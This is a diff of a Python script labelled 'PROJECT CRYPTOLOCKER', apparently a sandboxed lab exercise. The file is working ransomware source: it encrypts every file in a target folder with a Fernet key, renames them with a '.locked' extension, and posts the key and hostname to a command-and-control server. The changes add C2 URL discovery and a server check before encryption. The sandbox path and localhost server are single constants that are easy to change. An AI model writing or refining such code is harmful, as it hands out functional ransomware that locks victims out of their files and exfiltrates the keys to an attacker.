@@ -1,4 +1,3 @@
-
 import os
 import socket
 import requests
@@ -9,34 +8,57 @@ from cryptography.fernet import Fernet
 # ==========================================
 DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
 TARGET_DIRECTORY = os.path.join(DESKTOP_PATH, "DUMMY_TARGET")
-C2_SERVER_URL = "http://localhost/c2_server/receive.php" 
+
+def resolve_c2_url():
+    """Checks local web server configurations to dynamically find the correct C2 URL."""
+    local_endpoints = [
+        "http://localhost/c2_server/get_config.php",
+        "http://localhost:8080/c2_server/get_config.php"
+    ]
+    
+    for endpoint in local_endpoints:
+        try:
+            response = requests.get(endpoint, timeout=2)
+            if response.status_code == 200:
+                config_data = response.json()
+                return config_data.get("c2_url")
+        except Exception:
+            continue
+            
+    return "http://localhost/c2_server/receive.php"
+
+# Dynamically set the URL based on which machine is running the code
+C2_SERVER_URL = resolve_c2_url()
 # ==========================================
 
 def generate_key():
     """Generates a secure AES-128 key."""
     return Fernet.generate_key()
 
-def exfiltrate_key(key):
-    """Sends the key to the C2 server after encryption is done."""
-    machine_name = socket.gethostname()
-    data = {
-        "pc_name": machine_name,
-        "key": key.decode('utf-8')
-    }
-    
+def check_server_availability():
+    """
+    Step 2: Pre-flight check. Pings the C2 server to verify XAMPP is running.
+    Returns True if available, False otherwise.
+    """
     try:
-        response = requests.post(C2_SERVER_URL, data=data, timeout=5)
-        if "Exfiltration Successful" in response.text:
-            print("[+] SUCCESS: Key exfiltrated successfully to the C2 server.")
-        else:
-            print(f"[-] C2 Server rejected the key. Server said: {response.text}")
-    except Exception as e:
-        print("[-] C2 Server unreachable. (Is XAMPP running?)")
+        # Send a quick GET request to check if the server path is responsive
+        response = requests.get(C2_SERVER_URL, timeout=3)
+        # Our custom script returns a 404 for GET requests, which means the server IS alive!
+        # Standard connection success (200) or our hidden response (404) means the port is open.
+        if response.status_code in [200, 404]:
+            print("[+] SERVER CHECK: C2 Server (XAMPP) is online and responsive.")
+            return True
+    except requests.exceptions.RequestException:
+        pass
+    
+    print(f"[-] SERVER CHECK ERROR: C2 Server at {C2_SERVER_URL} is unreachable!")
+    print("[-] Aborting routine to prevent permanent data loss. Please start XAMPP.")
+    return False
 
 def encrypt_files(key):
-    """Scans the folder, checks if files are accessible/unlocked, and encrypts them."""
+    """Step 3: Scans the target folder and encrypts unencrypted data."""
     if not os.path.exists(TARGET_DIRECTORY):
-        print(f"[-] ERROR: Sandbox not found at {TARGET_DIRECTORY}")
+        print(f"[-] ERROR: Sandbox directory not found at {TARGET_DIRECTORY}")
         return False
 
     print(f"[*] Scanning target folder: {TARGET_DIRECTORY}")
@@ -47,48 +69,67 @@ def encrypt_files(key):
         for file in files:
             file_path = os.path.join(root, file)
             
-            # Check if the file is already locked
+            # If already encrypted, do absolutely nothing
             if file_path.endswith(".locked"):
-                print(f"  [.] Skipped (Already Encrypted): {file}")
+                print(f"  [.] Already Encrypted (No action): {file}")
                 continue
                 
             try:
-                # Check accessibility by attempting to read the file bytes
                 with open(file_path, "rb") as f:
                     original_data = f.read()
                 
-                # Perform encryption
                 encrypted_data = fernet.encrypt(original_data)
                 
                 with open(file_path, "wb") as f:
                     f.write(encrypted_data)
                 
                 os.rename(file_path, file_path + ".locked")
-                print(f"  [+] Encrypted: {file}")
+                print(f"  [+] Encrypted successfully: {file}")
                 encrypted_any = True
                 
             except Exception as e:
-                print(f"  [-] Skipped {file}: Access Denied or File in Use")
+                print(f"  [-] Skipped {file}: Access Denied")
 
     return encrypted_any
+
+def exfiltrate_key(key):
+    """Step 4: Transmits the key to the server after successful encryption."""
+    machine_name = socket.gethostname()
+    data = {
+        "pc_name": machine_name,
+        "key": key.decode('utf-8')
+    }
+    
+    try:
+        response = requests.post(C2_SERVER_URL, data=data, timeout=5)
+        if "Exfiltration Successful" in response.text:
+            print("[+] TRANSMISSION SUCCESS: Key logged securely in the database.")
+        else:
+            print(f"[-] TRANSMISSION ERROR: Server rejected the key. Response: {response.text}")
+    except Exception as e:
+        print("[-] TRANSMISSION FATAL ERROR: Lost connection to server during exfiltration.")
 
 if __name__ == "__main__":
     print("====================================")
     print(" PROJECT CRYPTOLOCKER - PAYLOAD EXEC")
     print("====================================\n")
     
-    # Step 1: Generate the key
+    # Sequence Step 1: Generate the local cryptographic key
     my_aes_key = generate_key()
-    print("[*] Generated local cryptographic key.")
+    print("[*] Sequence Step 1: Generated local cryptographic key.")
     
-    # Step 2: Scan, verify accessibility, and encrypt files first
-    files_were_locked = encrypt_files(my_aes_key)
-    
-    # Step 3: Send the key to the server if new files were processed
-    if files_were_locked:
-        print("\n[*] Initializing network transmission...")
-        exfiltrate_key(my_aes_key)
-    else:
-        print("\n[*] No new files required encryption. Network transmission skipped.")
-    
-    print("\n[+] Execution complete.")
+    # Sequence Step 2: Check server availability before doing any damage
+    if check_server_availability():
+        
+        # Sequence Step 3: Scan, verify files, and execute encryption
+        print("\n[*] Sequence Step 3: Initiating filesystem modification routine...")
+        files_were_locked = encrypt_files(my_aes_key)
+        
+        # Sequence Step 4: Exfiltrate key only if files were newly encrypted
+        if files_were_locked:
+            print("\n[*] Sequence Step 4: Forwarding encryption token to core infrastructure...")
+            exfiltrate_key(my_aes_key)
+        else:
+            print("\n[*] Sequence Step 4: No modifications required. Transmission routine bypassed.")
+            
+    print("\n[+] Execution sequence complete.")
